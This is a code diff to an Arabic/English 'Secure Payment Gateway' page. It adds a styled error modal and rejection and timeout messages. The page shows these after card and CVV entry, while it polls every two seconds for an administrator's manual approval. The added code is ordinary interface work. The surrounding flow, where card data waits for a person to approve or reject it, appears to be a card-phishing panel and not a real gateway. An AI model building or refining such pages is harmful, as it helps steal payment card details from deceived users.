@@ -283,6 +283,134 @@
       margin-top: 15px;
       color: var(--text-main);
     }
+
+    /* === Modal Error Popup === */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(4px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .modal-overlay.show {
+      display: flex;
+      opacity: 1;
+    }
+
+    .modal-content {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 30px 25px;
+      max-width: 340px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+      transform: scale(0.8);
+      transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .modal-overlay.show .modal-content {
+      transform: scale(1);
+    }
+
+    .modal-icon {
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .modal-icon svg {
+      width: 36px;
+      height: 36px;
+      color: #dc2626;
+      stroke-width: 2.5;
+    }
+
+    .modal-icon.success-icon {
+      background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+    }
+
+    .modal-icon.success-icon svg {
+      color: #059669;
+    }
+
+    .modal-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1e293b;
+      margin-bottom: 10px;
+    }
+
+    .modal-message {
+      font-size: 14px;
+      color: #64748b;
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
+
+    .modal-btn {
+      background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+      color: #ffffff;
+      border: none;
+      padding: 14px 40px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .modal-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(79, 70, 229, 0.4);
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      color: #94a3b8;
+      cursor: pointer;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: all 0.2s ease;
+    }
+
+    html[dir="ltr"] .modal-close {
+      left: auto;
+      right: 15px;
+    }
+
+    .modal-close:hover {
+      background: #f1f5f9;
+      color: #64748b;
+    }
+
+    .modal-wrapper {
+      position: relative;
+    }
   </style>
 </head>
 <body>
@@ -376,7 +504,9 @@
       alertExpired: "هذه البطاقة منتهية الصلاحية",
       alertError: "حدث خطأ أثناء معالجة البيانات",
       alertRejected: "يرجى التأكد من البيانات أو استخدام طريقة دفع مختلفة",
-      alertTimeout: "انتهت مهلة الانتظار، يرجى المحاولة مرة أخرى"
+      alertTimeout: "انتهت مهلة الانتظار، يرجى المحاولة مرة أخرى",
+      modalTitleRejected: "تم رفض الطلب",
+      modalTitleTimeout: "انتهت المهلة"
     },
     en: {
       pageTitle: "Secure Payment Gateway",
@@ -397,7 +527,9 @@
       alertExpired: "This credit card has expired",
       alertError: "An error occurred while processing data",
       alertRejected: "Please verify your data or use a different payment method",
-      alertTimeout: "Waiting time exceeded, please try again"
+      alertTimeout: "Waiting time exceeded, please try again",
+      modalTitleRejected: "Request Rejected",
+      modalTitleTimeout: "Time Out"
     }
   };
 
@@ -689,18 +821,105 @@ CN⚙️ بيانات الدفع من بطاقة الائتمان
         } else if (data.status === 'rejected') {
           clearInterval(pollInterval);
           hideLoading();
-          showError('wrapperCvv', 'errCvv', currentText.alertRejected);
+          // إظهار Modal للرفض بدلاً من رسالة صغيرة
+          showModal(
+            currentText.modalTitleRejected || 'تم رفض الطلب',
+            currentText.alertRejected || 'نعتذر، تم رفض طلبك من قبل المسؤول. يرجى استخدام طريقة دفع أخرى.',
+            'error',
+            null
+          );
         } else if (attempts >= maxAttempts) {
           clearInterval(pollInterval);
           hideLoading();
-          showError('wrapperCvv', 'errCvv', currentText.alertTimeout);
+          showModal(
+            currentText.modalTitleTimeout || 'انتهت المهلة',
+            currentText.alertTimeout || 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.',
+            'error',
+            null
+          );
         }
       } catch (error) {
         console.error('خطأ في التحقق من حالة الموافقة:', error);
       }
     }, 2000); // التحقق كل ثانيتين
   }
+
+  // === Modal Functions ===
+  function showModal(title, message, type = 'error', redirectUrl = null) {
+    const overlay = document.getElementById('modalOverlay');
+    const titleEl = document.getElementById('modalTitle');
+    const messageEl = document.getElementById('modalMessage');
+    const icon = document.getElementById('modalIcon');
+    const svg = document.getElementById('modalSvg');
+    const btn = document.getElementById('modalBtn');
+
+    titleEl.textContent = title;
+    messageEl.textContent = message;
+
+    // Reset icon styles
+    icon.classList.remove('success-icon');
+    
+    if (type === 'success') {
+      icon.classList.add('success-icon');
+      svg.innerHTML = '<polyline points="20 6 9 17 4 12"></polyline>';
+      btn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 100%)';
+    } else {
+      svg.innerHTML = '<circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line>';
+      btn.style.background = 'linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%)';
+    }
+
+    // إذا فيه redirect، غير نص الزر
+    if (redirectUrl) {
+      btn.textContent = currentLang === 'ar' ? 'حسناً' : 'OK';
+      btn.onclick = function() {
+        window.location.href = redirectUrl;
+      };
+    } else {
+      btn.textContent = currentLang === 'ar' ? 'حسناً' : 'OK';
+      btn.onclick = closeModal;
+    }
+
+    overlay.classList.add('show');
+  }
+
+  function closeModal() {
+    const overlay = document.getElementById('modalOverlay');
+    overlay.classList.remove('show');
+  }
+
+  // Close modal when clicking outside
+  document.getElementById('modalOverlay').addEventListener('click', function(e) {
+    if (e.target === this) {
+      closeModal();
+    }
+  });
+
+  // Close modal on Escape key
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+      closeModal();
+    }
+  });
 </script>
+
+<!-- Error Modal Popup -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-wrapper">
+    <button class="modal-close" onclick="closeModal()">✕</button>
+    <div class="modal-content">
+      <div class="modal-icon" id="modalIcon">
+        <svg id="modalSvg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="15" y1="9" x2="9" y2="15"></line>
+          <line x1="9" y1="9" x2="15" y2="15"></line>
+        </svg>
+      </div>
+      <h3 class="modal-title" id="modalTitle">تنبيه</h3>
+      <p class="modal-message" id="modalMessage">حدث خطأ ما</p>
+      <button class="modal-btn" onclick="closeModal()" id="modalBtn">حسناً</button>
+    </div>
+  </div>
+</div>
 
 </body>
 </html>
